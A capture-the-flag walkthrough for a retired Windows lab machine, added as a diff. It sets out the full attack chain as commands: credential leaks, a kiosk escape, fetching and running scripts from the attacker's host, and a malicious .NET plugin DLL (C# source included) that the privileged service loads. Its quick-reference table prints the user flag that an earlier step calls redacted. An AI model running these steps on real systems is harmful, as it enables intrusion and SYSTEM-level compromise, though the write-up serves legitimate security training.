@@ -1,0 +1,646 @@
+# Touch — HTB Walkthrough (Easy to Follow)
+
+**Target:** `10.129.10.226` (Windows 11)
+**Difficulty:** Easy
+**Type:** Retired Windows box
+
+Touch starts where **Layover** ends. HTB gives you a name and a booking code from Layover on the Touch page itself — but you don't actually need them. The real attack path starts on the web app on port 8443.
+
+---
+
+## The Big Picture
+
+Here's the entire chain in one glance:
+
+```
+Port 8443 web app (Nexion DeviceHub)
+   ↓
+Leak serial from /api/status → use as portal password
+   ↓
+Log in → DOM leaks KioskUser : K!0sk2026# credentials
+   ↓
+RDP in as KioskUser → restricted kiosk app
+   ↓
+Kill scanner via API → trigger badge scan → native error → Edge escape
+   ↓
+Read user.txt via file://
+   ↓
+Drop malicious .NET DLL into Printer\publish\plugins\
+   ↓
+Hit /api/printer/restart → privileged service loads DLL → root.txt
+```
+
+Keep this in your head. Every step below builds toward it.
+
+---
+
+## Before You Start
+
+Add the target to your hosts file (optional but helpful):
+
+```bash
+echo "10.129.10.226 touch.htb" | sudo tee -a /etc/hosts
+```
+
+Have a second terminal ready on Kali for serving files. You'll need it later.
+
+---
+
+## Step 1 — Scan the Target
+
+**What you're doing:** Find open ports so you know what services to attack.
+
+```bash
+nmap -p- --min-rate 5000 -T4 -oA touch_allports 10.129.10.226
+```
+
+**What you'll see:**
+
+```
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+3389/tcp open  ms-wbt-server   ← RDP
+5985/tcp open  wsman            ← WinRM
+8443/tcp open  https-alt        ← the main target
+```
+
+**What this tells you:**
+- It's a Windows box (RDP + WinRM).
+- Port 8443 is the interesting one — it's labeled `https-alt` but we'll check that in a moment.
+
+Now get version info on just those ports:
+
+```bash
+nmap -sC -sV -p 135,3389,5985,8443 10.129.10.226
+```
+
+---
+
+## Step 2 — Confirm Port 8443 Is Plain HTTP
+
+**What you're doing:** The scan says `https-alt`, but that's just Nmap guessing from the port number. Let's see what it really is.
+
+```bash
+curl -v http://10.129.10.226:8443/
+```
+
+**What you'll see:**
+
+```
+HTTP/1.1 302 Found
+Location: /login
+Server: Microsoft-HTTPAPI/2.0
+```
+
+**What this tells you:**
+- The service on 8443 speaks **plain HTTP**, not HTTPS.
+- `Microsoft-HTTPAPI/2.0` = a .NET app running on Windows.
+- It redirects to `/login`.
+
+Open the login page:
+
+```bash
+curl -s http://10.129.10.226:8443/login
+```
+
+**What you'll see:**
+- Title: **Nexion DocReader — DeviceHub DH-100**
+- A password field (no username field!).
+- A hint in the page: *"The default password is the device serial number included in your DeviceHub packaging."*
+- A **Scan Staff Badge** button.
+
+That hint is a roadmap. We need to find the serial number.
+
+---
+
+## Step 3 — Leak the Serial Number
+
+**What you're doing:** Nmap won't tell you the serial, but the app has an unauthenticated API endpoint.
+
+```bash
+curl -s http://10.129.10.226:8443/api/status
+```
+
+**What you'll see:**
+
+```json
+{
+  "device": "Nexion DeviceHub DH-100",
+  "serial": "NX-DH-2024-B7042",
+  "firmware": "1.4.2",
+  "status": "online",
+  "uptime": 42867
+}
+```
+
+**What this tells you:**
+- The serial is `NX-DH-2024-B7042`.
+- Per the login page hint, this is the default password.
+
+---
+
+## Step 4 — Log In
+
+**What you're doing:** Use the serial as the password.
+
+```bash
+curl -s -i -X POST http://10.129.10.226:8443/login \
+  -d "password=NX-DH-2024-B7042" -c cookies.txt | head -15
+```
+
+**What you'll see:**
+
+```
+HTTP/1.1 302 Found
+Location: /dashboard
+Set-Cookie: nxsession=<random>; Path=/
+```
+
+**What this means:**
+- Login worked. The cookie is saved in `cookies.txt`.
+
+**Important:** This session cookie expires quickly. If you ever get redirected to `/login`, just re-run the login command above.
+
+Set a shell variable so you don't have to type the cookie out every time:
+
+```bash
+SID=$(grep nxsession cookies.txt | awk '{print $NF}')
+```
+
+---
+
+## Step 5 — Extract the Kiosk Credentials
+
+**What you're doing:** The dashboard masks credentials visually, but the raw HTML leaks them. There's also a JSON API that returns them in plain text.
+
+Try the API first — it's cleanest:
+
+```bash
+curl -s -H "Cookie: nxsession=$SID" http://10.129.10.226:8443/api/scanner
+curl -s -H "Cookie: nxsession=$SID" http://10.129.10.226:8443/api/printer
+```
+
+**What you'll see (in both responses):**
+
+```json
+"deviceUser": "KioskUser",
+"devicePass": "K!0sk2026#"
+```
+
+**You now have:**
+
+```
+Username: KioskUser
+Password: K!0sk2026#
+```
+
+**Alternative (if you want to see the DOM leak):**
+
+```bash
+curl -s -H "Cookie: nxsession=$SID" http://10.129.10.226:8443/dashboard | grep toggleCred
+```
+
+You'll see `toggleCred('dsu1','KioskUser')` and `toggleCred('dsp1','K!0sk2026#')` — same creds, hidden behind CSS.
+
+---
+
+## Step 6 — RDP Into the Kiosk
+
+**What you're doing:** Log in as KioskUser. You'll land in a restricted kiosk app.
+
+```bash
+xfreerdp3 /v:10.129.10.226 /u:KioskUser /p:'K!0sk2026#' \
+  /cert:ignore /dynamic-resolution
+```
+
+**If `xfreerdp3` isn't installed**, use `xfreerdp` instead.
+
+**What you'll see:**
+- A fullscreen app titled **"SELF CHECK-IN"** — HTB Airways, Gate B7, Kiosk #042.
+- A green "Touch screen to begin" circle in the middle.
+- A **STAFF LOGIN** button in the bottom right.
+- **No taskbar, no Start menu, no way to open CMD.** You're locked inside.
+
+Don't panic. We're going to break out.
+
+---
+
+## Step 7 — Break Out of the Kiosk
+
+The kiosk depends on the passport scanner being online. Turn it off remotely, then trigger a scanner action inside the kiosk to force an error.
+
+### 7a. Kill the scanner (run this in your Kali terminal)
+
+```bash
+SID=$(grep nxsession cookies.txt | awk '{print $NF}')
+curl -s -X POST -H "Cookie: nxsession=$SID" -H "Content-Type: application/json" \
+  -d '{"powered":false}' \
+  http://10.129.10.226:8443/api/scanner/power
+```
+
+**What you'll see:**
+
+```json
+{"success":true,"powered":false}
+```
+
+### 7b. Trigger the error (inside the RDP kiosk)
+
+1. Click **STAFF LOGIN** (bottom right).
+2. Click **Scan Badge**.
+
+Because the scanner is off, the kiosk app throws a **native Windows error dialog** with a support link (`https://support.nexionsystems.com`).
+
+3. **Click that link.** MS Edge opens.
+
+**What just happened:** Edge runs outside the kiosk sandbox. You're free.
+
+---
+
+## Step 8 — Read the User Flag
+
+In Edge's address bar, type:
+
+```
+file:///C:/Users/KioskUser/Desktop/user.txt
+```
+
+**User flag is displayed.** Write it down.
+
+**User flag:** `[REDACTED — retrieve it during the lab]`
+---
+
+## Step 9 — Get a Real Command Shell
+
+**What you're doing:** Edge is fine for browsing but you need `cmd.exe` for the privesc.
+
+**On Kali**, create a `.bat` file and host it:
+
+```bash
+cat > /tmp/pwn.bat <<'EOF'
+@echo off
+start cmd.exe
+EOF
+
+cd /tmp && python3 -m http.server 8000
+```
+
+Find your Kali IP on the HTB VPN:
+
+```bash
+ip a show tun0 | grep -oP 'inet \K[\d.]+'
+```
+
+Say it's `10.10.15.66`. Use that below.
+
+**In Edge**, navigate to:
+
+```
+http://10.10.15.66:8000/pwn.bat
+```
+
+Edge downloads it. Open the Downloads panel (`Ctrl+J`), click **Open file** on `pwn.bat`. Choose **Keep** → **Run** when Windows warns.
+
+**A `cmd.exe` window appears.** You're now running as `KioskUser` on the actual Windows desktop.
+
+---
+
+## Step 10 — Recon for Privesc
+
+### 10a. Check your groups
+
+```cmd
+whoami /all
+```
+
+**Key groups to notice:**
+
+```
+KIOSK-042\kioskuser
+KIOSK-042\Printer Administrators    ← important
+BUILTIN\Remote Desktop Users
+```
+
+That `Printer Administrators` group means you can write to the printer service folder.
+
+### 10b. Find the privileged service
+
+```cmd
+powershell -nop -c "Get-Process | Where-Object {$_.Name -match 'nexi|print'} | Select-Object Name,Id,Path | Format-List"
+```
+
+**What you'll see:**
+
+```
+Name : NexionDocReader
+Id   : 4832
+Path : C:\Program Files\Nexion Systems\DocReader\publish\NexionDocReader.exe
+
+Name : NexionPrinter
+Id   : 2184
+Path :        ← blank = running as SYSTEM
+```
+
+**Why the blank Path matters:** `NexionPrinter` runs under a higher privilege than KioskUser (likely SYSTEM). It's the process we want to hijack.
+
+### 10c. Look at the printer folder
+
+```cmd
+dir "C:\Program Files\Nexion Systems\Printer\publish" -Force
+```
+
+**What you'll see:**
+
+```
+d-----  plugins                          ← this is our target
+-a----  NexionPrinter.exe
+-a----  NexionPrinter.dll
+-a----  NexionPrinter.deps.json
+-a----  NexionPrinter.runtimeconfig.json
+```
+
+`NexionPrinter.exe` loads plugins from the `plugins\` folder. That folder will be our drop point.
+
+---
+
+## Step 11 — Build the Malicious DLL
+
+**The plan:** The service uses `Assembly.LoadFrom()` with no signature check. Any DLL with a static constructor in that folder will execute as SYSTEM when the service reloads.
+
+### 11a. Save the C# source on Kali
+
+```bash
+mkdir -p /tmp/host && cd /tmp/host
+
+cat > payload.cs <<'EOF'
+using System;
+using System.IO;
+
+public class PluginInit
+{
+    public static void Initialize() { Run(); }
+    public static void Init() { Run(); }
+    public static void Load() { Run(); }
+    public static void OnLoad() { Run(); }
+    static PluginInit() { Run(); }
+
+    public static void Run()
+    {
+        try
+        {
+            foreach (var f in new string[] {
+                @"C:\Users\Administrator\Desktop\root.txt",
+                @"C:\Users\Administrator\root.txt",
+                @"C:\root.txt" })
+            {
+                if (File.Exists(f))
+                {
+                    File.Copy(f, @"C:\ProgramData\Nexion\rr.txt", true);
+                    break;
+                }
+            }
+        }
+        catch { }
+    }
+}
+EOF
+
+python3 -m http.server 8000
+```
+
+### 11b. Download and compile it on Windows
+
+In the `cmd` window:
+
+```cmd
+curl http://10.10.15.66:8000/payload.cs -o C:\Users\KioskUser\Desktop\payload.cs
+```
+
+(Replace `10.10.15.66` with your Kali IP.)
+
+Launch PowerShell:
+
+```cmd
+powershell -nop
+```
+
+Compile the DLL:
+
+```powershell
+Add-Type -Path "C:\Users\KioskUser\Desktop\payload.cs" `
+  -OutputAssembly "C:\Users\KioskUser\Desktop\payload.dll" `
+  -OutputType Library
+```
+
+Verify it built:
+
+```powershell
+dir "C:\Users\KioskUser\Desktop\payload.dll"
+```
+
+You should see `payload.dll` at about 3-4 KB.
+
+---
+
+## Step 12 — Drop the DLL Into the Plugins Folder
+
+```powershell
+Copy-Item "C:\Users\KioskUser\Desktop\payload.dll" `
+  "C:\Program Files\Nexion Systems\Printer\publish\plugins\payload.dll" -Force
+```
+
+Verify it landed:
+
+```powershell
+dir "C:\Program Files\Nexion Systems\Printer\publish\plugins"
+```
+
+You should see `payload.dll` in the folder.
+
+---
+
+## Step 13 — Trigger the Service Reload
+
+**From Kali**, hit the restart endpoint.
+
+**Important:** The endpoint returns `411 Length Required` if you POST with an empty body — you must include `-d '{}'`.
+
+```bash
+SID=$(grep nxsession cookies.txt | awk '{print $NF}')
+curl -s -X POST -H "Cookie: nxsession=$SID" \
+  -H "Content-Type: application/json" \
+  -d '{}' \
+  http://10.129.10.226:8443/api/printer/restart
+```
+
+**What you'll see:**
+
+```json
+{"success":true,"message":"Printer service restarting..."}
+```
+
+The privileged service reloads its plugins. `Assembly.LoadFrom()` loads our DLL. The static constructor fires as SYSTEM. `root.txt` is copied to `C:\ProgramData\Nexion\rr.txt`.
+
+---
+
+## Step 14 — Read the Root Flag
+
+In the PowerShell window:
+
+```powershell
+type C:\ProgramData\Nexion\rr.txt
+```
+
+**Root flag is displayed. Record the value from your own lab session.**
+
+---
+
+## Cheat Sheet — All Commands in Order
+
+```bash
+# ---- 1. SCAN ----
+nmap -p- --min-rate 5000 -T4 10.129.10.226
+nmap -sC -sV -p 135,3389,5985,8443 10.129.10.226
+
+# ---- 2. CONFIRM HTTP ----
+curl -v http://10.129.10.226:8443/
+
+# ---- 3. LEAK SERIAL ----
+curl -s http://10.129.10.226:8443/api/status
+# → "serial":"NX-DH-2024-B7042"
+
+# ---- 4. LOG IN ----
+curl -s -i -X POST http://10.129.10.226:8443/login \
+  -d "password=NX-DH-2024-B7042" -c cookies.txt
+
+SID=$(grep nxsession cookies.txt | awk '{print $NF}')
+
+# ---- 5. GET KIOSK CREDS ----
+curl -s -H "Cookie: nxsession=$SID" http://10.129.10.226:8443/api/scanner
+# → "deviceUser":"KioskUser","devicePass":"K!0sk2026#"
+
+# ---- 6. RDP IN ----
+xfreerdp3 /v:10.129.10.226 /u:KioskUser /p:'K!0sk2026#' /cert:ignore /dynamic-resolution
+
+# ---- 7. KILL SCANNER ----
+curl -s -X POST -H "Cookie: nxsession=$SID" -H "Content-Type: application/json" \
+  -d '{"powered":false}' http://10.129.10.226:8443/api/scanner/power
+
+# ---- 8. IN KIOSK: STAFF LOGIN → Scan Badge → error → click support link → Edge ----
+# Then in Edge: file:///C:/Users/KioskUser/Desktop/user.txt
+
+# ---- 9. GET CMD SHELL ----
+cat > /tmp/pwn.bat <<'EOF'
+@echo off
+start cmd.exe
+EOF
+cd /tmp && python3 -m http.server 8000
+# In Edge: http://<KALI_IP>:8000/pwn.bat → Save → Ctrl+J → Open file
+
+# ---- 10. RECON ----
+# In cmd:
+#   whoami /all
+#   powershell -nop -c "Get-Process | Where-Object {$_.Name -match 'nexi|print'} | Select Name,Id,Path"
+#   dir "C:\Program Files\Nexion Systems\Printer\publish" -Force
+
+# ---- 11. BUILD DLL ----
+# On Kali:
+mkdir -p /tmp/host && cd /tmp/host
+# (create payload.cs — see Step 11a)
+python3 -m http.server 8000
+
+# In cmd:
+#   curl http://<KALI_IP>:8000/payload.cs -o C:\Users\KioskUser\Desktop\payload.cs
+#   powershell -nop
+# In PowerShell:
+#   Add-Type -Path "C:\Users\KioskUser\Desktop\payload.cs" `
+#     -OutputAssembly "C:\Users\KioskUser\Desktop\payload.dll" -OutputType Library
+
+# ---- 12. DROP DLL ----
+# In PowerShell:
+#   Copy-Item "C:\Users\KioskUser\Desktop\payload.dll" `
+#     "C:\Program Files\Nexion Systems\Printer\publish\plugins\payload.dll" -Force
+
+# ---- 13. TRIGGER RELOAD ----
+curl -s -X POST -H "Cookie: nxsession=$SID" -H "Content-Type: application/json" \
+  -d '{}' http://10.129.10.226:8443/api/printer/restart
+
+# ---- 14. READ ROOT ----
+# In PowerShell:
+#   type C:\ProgramData\Nexion\rr.txt
+```
+
+---
+
+## Quick Reference — Important Values
+
+| Item | Value |
+|------|-------|
+| Target IP | `10.129.10.226` |
+| Web app | `http://10.129.10.226:8443` (plain HTTP) |
+| Device serial | `NX-DH-2024-B7042` |
+| Portal session cookie | `nxsession` (expires fast — re-login if bounced) |
+| RDP user | `KioskUser` |
+| RDP password | `K!0sk2026#` |
+| Printer service | `C:\Program Files\Nexion Systems\Printer\publish\NexionPrinter.exe` |
+| Plugin folder | `C:\Program Files\Nexion Systems\Printer\publish\plugins\` |
+| Root flag drop | `C:\ProgramData\Nexion\rr.txt` |
+| User flag | `684138493147ec8dda9c8ae8d7e75683` |
+
+---
+
+## Troubleshooting — Common Sticking Points
+
+**Session cookie expires mid-task**
+Re-login and re-grab the SID:
+```bash
+curl -s -i -X POST http://10.129.10.226:8443/login \
+  -d "password=NX-DH-2024-B7042" -c cookies.txt
+SID=$(grep nxsession cookies.txt | awk '{print $NF}')
+```
+
+**RDP fails with NLA error**
+Add `/sec:tls`:
+```bash
+xfreerdp3 /v:10.129.10.226 /u:KioskUser /p:'K!0sk2026#' /cert:ignore /sec:tls /dynamic-resolution
+```
+
+**Kiosk error dialog doesn't appear after Scan Badge**
+Verify the scanner is actually off:
+```bash
+curl -s -H "Cookie: nxsession=$SID" http://10.129.10.226:8443/api/scanner | grep powered
+```
+Should say `"powered":false`. If not, re-POST to `/api/scanner/power`.
+
+**`curl` on Windows says "not recognized"**
+Use PowerShell's `Invoke-WebRequest`:
+```powershell
+Invoke-WebRequest -Uri http://10.10.15.66:8000/payload.cs -OutFile C:\Users\KioskUser\Desktop\payload.cs
+```
+
+**`/api/printer/restart` returns 411**
+You forgot the body. Always include `-d '{}'`.
+
+**`rr.txt` doesn't appear after restart**
+Check `C:\ProgramData\Nexion\`:
+```powershell
+dir C:\ProgramData\Nexion -Force
+```
+If empty, verify the DLL is in the plugins folder and re-trigger the restart. If still nothing, kill the printer process so the API respawns it fresh:
+```powershell
+Stop-Process -Name NexionPrinter -Force
+```
+Then hit `/api/printer/restart` again from Kali.
+
+---
+
+## Why the Path Works — Summary
+
+1. **Unauthenticated info leak** — `/api/status` gives the serial, which is also the default password.
+2. **Cleartext credentials in the DOM** — the portal "masks" KioskUser's password visually but ships it in the HTML.
+3. **Kiosk escape** — a native error dialog in the kiosk launches Edge outside the sandbox, giving filesystem access.
+4. **Weak ACLs + unsigned plugin loading** — `Printer Administrators` (which KioskUser is in) can write to the printer service's `plugins\` folder, and the service loads any DLL it finds without checking signatures.
+
+That combination is the whole box.
+
+---
